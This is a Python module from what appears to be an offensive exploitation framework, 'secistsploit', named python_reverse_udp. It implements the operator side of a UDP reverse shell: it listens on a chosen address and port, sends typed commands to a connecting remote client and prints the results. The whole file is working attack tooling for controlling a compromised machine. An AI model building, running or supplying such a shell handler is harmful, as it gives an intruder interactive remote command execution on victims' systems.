#!/usr/bin/env python3 -tt
# -*- coding: UTF-8 -*-
from socket import socket, AF_INET, SOCK_DGRAM
import codecs
import argparse
from secistsploit.core.exploit import *
from secistsploit.core.tcp.tcp_client import TCPClient


class Exploit(TCPClient):
    __info__ = {
        "name": "python_reverse_udp",
        "description": "python_reverse_udp",
        "authors": (
            "demonsec",
        ),
        "references": (
             "www.ggsec.cn "
             "www.secist.com"
        ),

    }

    lhost = OptIP("", "本地监听IP地址")
    lport = OptPort(4444, "本地监听端口")
    #lhost=(self.port)
    def __init__(self):
        self.endianness = "<"

    def run(self):
            LHOST=(self.lhost)
            LPORT=(self.lport)
            # Create UDP socket and assign to 'sock' object
            sock = socket(AF_INET, SOCK_DGRAM)
            # Bind UDP socket to localhost on 127.0.0.1 and UDP 53
            sock.bind((LHOST,LPORT))
            info= '\033[94m[*]\033[0m监听者ip地址 {LOCAL_IP}: {LOCAL_PORT}'.format(LOCAL_IP=LHOST,LOCAL_PORT=LPORT)
            print(info)
            while True:
                # Receive connection from client running 'UDP-Rshell.py'
                data, addr = sock.recvfrom(4096)
                # Obtain remote command and assign to variable 'resp'
                resp = input("SHELL >").encode()
                # Send remote command to client
                sock.sendto(resp,addr)
                # Receive command response from client
                data, addr = sock.recvfrom(4096)
                # Print response to screen
                print(codecs.decode(data, 'utf-8'))
